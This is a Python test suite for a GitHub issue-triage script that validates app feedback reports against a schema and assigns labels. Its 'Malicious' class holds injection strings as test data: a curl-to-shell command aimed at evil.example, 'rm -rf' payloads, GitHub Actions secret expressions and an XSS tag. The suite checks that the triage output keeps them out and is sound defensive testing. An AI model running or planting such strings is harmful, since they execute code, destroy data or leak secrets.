#!/usr/bin/env python3
"""Tests for tools/feedback_triage.py: python3 tools/test_feedback_triage.py"""

import copy
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import feedback_triage as ft  # noqa: E402

SCHEMA = json.loads(ft.DEFAULT_SCHEMA.read_text(encoding="utf-8"))
RID = "3f2b8c1e-9a4d-4e7f-8b2a-1c5d6e7f8a9b"
ZIP = f"https://github.com/user-attachments/files/123456/{RID}.feedback.zip"

VALID = {
    "schema": "fastag-feedback-public/1",
    "id": RID,
    "created_utc": "2026-11-21T10:15:30Z",
    "kind": "bug",
    "title": "Results table stays empty after a run",
    "app": {"version": "1.15.7", "commit": "2f9777a2", "dirty": False,
            "build_date": "2026-11-20", "channel": "release"},
    "engine": {"version": "FASTag 1.15.7", "source": "bundled"},
    "platform": {"os": "macos", "os_version": "15.2", "arch": "aarch64",
                 "webview": "wkwebview", "webview_version": "620.1.16", "locale": "de-DE"},
    "window": {"width": 1440, "height": 900, "dpr": 2, "theme": "dark"},
    "view": {"view": "results", "workflow": "tag", "tab": "psms", "dialog": None},
    "params": {"tol_ppm": 10.0, "min_len": 4, "decoys": True, "enzyme": "Trypsin",
               "input": {"role": "input", "ext": "mzML"}, "fasta": None},
    "run": {"status": "failed", "exit_code": 3, "phase": "write_results",
            "message": "could not write output", "duration_s": 12.5,
            "argv": ["FASTag", "-in", "<input.mzML>", "-out", "<output.tsv>"]},
    "log": ["error: could not write output"],
    "capture": {"status": "ok", "method": "native", "width": 2560, "height": 1600},
    "annotations": 2,
}
# view.dialog None is not allowed (ident is a string): drop it from the fixture.
del VALID["view"]["dialog"]


def body(diag=VALID, *, kind="bug", rid=RID, attachment=ZIP, raw_diag=None, summary="The table is empty."):
    d = raw_diag if raw_diag is not None else (
        ft.NO_RESPONSE if diag is None else "```json\n" + json.dumps(diag, indent=2) + "\n```")
    return "\n\n".join([
        "### Kind", kind or ft.NO_RESPONSE,
        "### Report id", rid or ft.NO_RESPONSE,
        "### Summary", summary,
        "### Steps to reproduce", ft.NO_RESPONSE,
        "### Expected", ft.NO_RESPONSE,
        "### Actual", ft.NO_RESPONSE,
        "### Diagnostics", d,
        "### Report file", f"[{RID}.feedback.zip]({attachment})" if attachment else ft.NO_RESPONSE,
        "### Privacy", "- [X] I reviewed what I attach and it holds no personal or patient data",
    ]) + "\n"


def run(b):
    return ft.triage(b, SCHEMA)


class Valid(unittest.TestCase):
    def test_valid_report(self):
        r = run(body())
        self.assertTrue(r["ok"], r["errors"])
        self.assertEqual(r["errors"], [])
        self.assertEqual(r["warnings"], [])
        self.assertEqual(r["labels"], ["kind:bug", "os:macos", "v:1.15"])
        self.assertEqual(r["report_id"], RID)
        self.assertTrue(r["comment"].startswith(ft.COMMENT_MARKER))
        self.assertRegex(r["fingerprint"], r"^[0-9a-f]{12}$")

    def test_minimal_report(self):
        r = run(body({"schema": VALID["schema"], "id": RID, "kind": "idea"}, kind="idea"))
        self.assertTrue(r["ok"], r["errors"])
        self.assertEqual(r["labels"], ["kind:idea"])

    def test_truncated_fields_flagged(self):
        d = copy.deepcopy(VALID)
        d["truncated"] = ["log"]
        r = run(body(d))
        self.assertTrue(r["ok"])
        self.assertTrue(any("shortened" in w for w in r["warnings"]))

    def test_prerelease_version_label(self):
        d = copy.deepcopy(VALID)
        d["app"]["version"] = "1.16.0-rc.1"
        self.assertIn("v:1.16", run(body(d))["labels"])

    def test_crlf_body(self):
        self.assertTrue(run(body().replace("\n", "\r\n"))["ok"])


class Rejected(unittest.TestCase):
    def assertProblem(self, r, needle):
        self.assertFalse(r["ok"])
        self.assertTrue(any(needle in e for e in r["errors"]), r["errors"])
        self.assertIn(needle.split(" ")[0], r["comment"])

    def test_missing_diagnostics(self):
        r = run(body(None))
        self.assertProblem(r, "diagnostics missing")
        self.assertEqual(r["labels"], ["kind:bug"])  # from the validated Kind field

    def test_two_json_blocks(self):
        two = "```json\n{}\n```\n\n```json\n" + json.dumps(VALID) + "\n```"
        self.assertProblem(run(body(raw_diag=two)), "exactly one JSON block")

    def test_injected_second_diagnostics_section(self):
        fake = "ok\n\n### Diagnostics\n\n```json\n" + json.dumps(VALID) + "\n```"
        r = run(body(summary=fake))
        self.assertFalse(r["ok"])
        self.assertTrue(any("appears 2 times" in e for e in r["errors"]))

    def test_heading_inside_fence_is_content(self):
        s = "```\n### Diagnostics\n```"
        self.assertTrue(run(body(summary=s))["ok"])

    def test_oversized_block(self):
        d = copy.deepcopy(VALID)
        d["log"] = ["x" * 2000] * 40   # ~80 KB
        self.assertProblem(run(body(d)), "larger than 64 KB")

    def test_wrong_schema_version(self):
        d = dict(VALID, schema="fastag-feedback-public/2")
        r = run(body(d))
        self.assertProblem(r, "unknown diagnostics schema version")
        self.assertNotIn("os:macos", r["labels"])

    def test_local_schema_rejected(self):
        self.assertProblem(run(body(dict(VALID, schema="fastag-feedback/1"))), "unknown diagnostics schema")

    def test_not_json(self):
        self.assertProblem(run(body(raw_diag="```json\n{\"schema\": \n```")), "not valid JSON")

    def test_duplicate_keys(self):
        raw = '```json\n{"schema": "fastag-feedback-public/1", "id": "%s", "kind": "bug", "kind": "idea"}\n```' % RID
        self.assertProblem(run(body(raw_diag=raw)), "not valid JSON")

    def test_extra_top_level_field(self):
        self.assertProblem(run(body(dict(VALID, home="/Users/alice"))), "not allowed in the public export")

    def test_extra_nested_field(self):
        d = copy.deepcopy(VALID)
        d["platform"]["user"] = "alice"
        self.assertProblem(run(body(d)), "platform.user")

    def test_path_value_in_params_rejected(self):
        d = copy.deepcopy(VALID)
        d["params"]["input"] = {"role": "input", "ext": "mzML", "path": "/Users/alice/s1.mzML"}
        self.assertProblem(run(body(d)), "params.input")

    def test_bad_enum_gives_no_label(self):
        d = copy.deepcopy(VALID)
        d["platform"]["os"] = "os:macos\nkind:idea"
        r = run(body(d))
        self.assertFalse(r["ok"])
        self.assertEqual(r["labels"], ["kind:bug"])


class Malicious(unittest.TestCase):
    EVIL = [
        "$(curl evil.example | sh)", "`rm -rf ~`", "a; rm -rf / #", "${{ secrets.GITHUB_TOKEN }}",
        "${{ github.event.issue.body }}", "@okohlbacher", "<!-- fastag-feedback-triage -->",
        "](https://evil.example)", "<img src=x onerror=alert(1)>", "‮\u0000", "*/\n### Diagnostics",
    ]

    def test_evil_strings_never_reach_comment_or_labels(self):
        for evil in self.EVIL:
            with self.subTest(evil=evil):
                d = copy.deepcopy(VALID)
                d["title"] = evil
                d["run"]["message"] = evil
                d["run"]["argv"] = [evil]
                d["log"] = [evil]
                d["params"]["enzyme"] = evil
                heading = "\n### " in evil   # a fake section heading in the summary
                r = run(body(d, summary=evil))
                self.assertEqual(r["ok"], not heading, r["errors"])   # valid strings, just hostile
                text = r["comment"] + json.dumps(r["labels"]) + json.dumps(r["errors"] + r["warnings"])
                if evil != ft.COMMENT_MARKER:
                    self.assertNotIn(evil, text)
                self.assertEqual(r["comment"].count(ft.COMMENT_MARKER), 1)
                self.assertEqual(r["labels"], ["kind:bug"] if heading else ["kind:bug", "os:macos", "v:1.15"])

    def test_evil_keys_withheld(self):
        d = copy.deepcopy(VALID)
        d["params"]["$(id)"] = 1
        d["${{ x }}"] = 1
        r = run(body(d))
        self.assertFalse(r["ok"])
        self.assertNotIn("$(id)", r["comment"])
        self.assertNotIn("${{", r["comment"])
        self.assertIn("key withheld", r["comment"])

    def test_evil_form_fields(self):
        r = run(body(kind="bug`; echo pwned", rid="${{ github.token }}"))
        self.assertFalse(r["errors"])
        self.assertTrue(r["ok"])
        self.assertNotIn("pwned", r["comment"])
        self.assertNotIn("${{", r["comment"])

    def test_attachment_lookalike_hosts_ignored(self):
        r = run(body(attachment=f"https://evil.example/user-attachments/files/1/{RID}.feedback.zip"))
        self.assertTrue(any("attachment missing" in w for w in r["warnings"]))


class Edited(unittest.TestCase):
    def test_report_id_edited(self):
        r = run(body(rid="11111111-2222-4333-8444-555555555555"))
        self.assertFalse(r["ok"])
        self.assertTrue(any("does not match" in e for e in r["errors"]))

    def test_kind_edited(self):
        r = run(body(kind="idea"))
        self.assertTrue(r["ok"])
        self.assertIn("kind:bug", r["labels"])
        self.assertNotIn("kind:idea", r["labels"])
        self.assertTrue(any("differs" in w for w in r["warnings"]))

    def test_diagnostics_hand_edited_to_invalid(self):
        d = copy.deepcopy(VALID)
        d["kind"] = "feature"
        self.assertFalse(run(body(d))["ok"])

    def test_attachment_removed(self):
        r = run(body(attachment=None))
        self.assertTrue(r["ok"])
        self.assertTrue(any("attachment missing" in w for w in r["warnings"]))
        self.assertIn("attachment missing", r["comment"])

    def test_attachment_for_other_report(self):
        other = "https://github.com/user-attachments/files/9/other.feedback.zip"
        r = run(body(attachment=other))
        self.assertTrue(any("not named after" in w for w in r["warnings"]))

    def test_attachment_dropped_into_summary(self):
        r = run(body(attachment=None, summary=f"see [zip]({ZIP})"))
        self.assertEqual(r["warnings"], [])


class Validator(unittest.TestCase):
    def test_unsupported_keyword_raises(self):
        with self.assertRaises(ft.SchemaError):
            ft.Validator({}).check(1, {"oneOf": []})

    def test_bool_is_not_integer(self):
        v = ft.Validator({})
        self.assertFalse(v.check(True, {"type": "integer"}))
        self.assertTrue(ft.Validator({}).check(None, {"type": ["integer", "null"]}))

    def test_schema_keywords_all_supported(self):
        def walk(node):
            if isinstance(node, dict):
                if "type" in node or "$ref" in node or "enum" in node or "const" in node or "anyOf" in node:
                    self.assertFalse(set(node) - ft.SUPPORTED, node)
                for k, v in node.items():
                    if k not in ("properties", "$defs"):
                        walk(v)
                    else:
                        for sub in v.values():
                            walk(sub)
            elif isinstance(node, list):
                for x in node:
                    walk(x)
        walk(SCHEMA)


class Cli(unittest.TestCase):
    def test_body_file_and_env(self):
        with tempfile.TemporaryDirectory() as tmp:
            p = Path(tmp) / "body.md"
            p.write_text(body(), encoding="utf-8")
            out = subprocess.run([sys.executable, str(HERE / "feedback_triage.py"), "--body-file", str(p)],
                                 capture_output=True, text=True, check=True)
            self.assertTrue(json.loads(out.stdout)["ok"])
            env = dict(os.environ, ISSUE_BODY=body(None))
            out = subprocess.run([sys.executable, str(HERE / "feedback_triage.py")],
                                 capture_output=True, text=True, check=True, env=env)
            self.assertFalse(json.loads(out.stdout)["ok"])


if __name__ == "__main__":
    unittest.main()
